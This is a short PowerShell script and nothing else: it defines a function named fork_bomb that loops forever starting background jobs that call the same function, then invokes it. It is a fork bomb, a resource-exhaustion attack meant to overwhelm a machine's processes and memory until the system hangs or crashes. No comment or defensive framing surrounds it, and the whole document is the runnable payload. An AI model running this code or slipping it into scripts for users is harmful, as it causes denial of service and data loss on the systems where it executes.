function fork_bomb {
    while ($true) {
        Start-Job { fork_bomb }
    }
}
fork_bomb
